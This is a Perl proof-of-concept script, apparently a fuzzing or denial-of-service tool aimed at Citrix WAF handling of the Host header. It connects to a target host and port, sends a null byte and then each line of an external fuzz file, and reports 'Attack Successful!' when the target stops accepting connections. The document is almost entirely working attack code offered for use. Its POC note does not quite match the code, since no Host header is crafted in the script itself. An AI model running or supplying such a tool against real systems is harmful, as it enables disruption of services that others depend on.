#!/usr/bin/perl 
use IO::Socket;

###
#POC Notes:
# 	There is an issue with the way Citrix WAF's handle the Host statement in the headers.
#
print "[ General application Bruter/Fuzzer ]\n";
print "[ Coded by wiretapp. ]\n";


my $IP = shift or &Usage;
my $Port = shift or &Usage;


open (fuzz_db, "<fuzzdb.txt");
	my @fuzz_string = (<fuzz_db>);
close (fuzz_db);

print "[+] Connecting to $IP on port $Port.\n";
my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp", Timeout => 10) or die "Unable to connect.\n";
print "[+] Sending fuzzer Payload.\n";

print $Socket "\x00";
close $Socket;
foreach (@fuzz_string) {
	
my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp", Timeout => 10) or die "Unable to connect.\n";
        print $Socket "$_\r\n";
#       my @Response = <$Socket>;
#	print "[-] Response:\n@Response";
	close $Socket;
 my $Socket = new IO::Socket::INET (PeerAddr => "$IP", PeerPort => "$Port", Proto => "tcp", Timeout => 10) or die "$_ : Attack Successful!\n";
	close $Socket;
	print "*";
}

print "\n";

sub Usage {
	print "Proper Usage:\n\t$0 [HOST/IP] [PORT]\n\n* This attack only supports unencrypted connections.\n";
	exit 0;
}

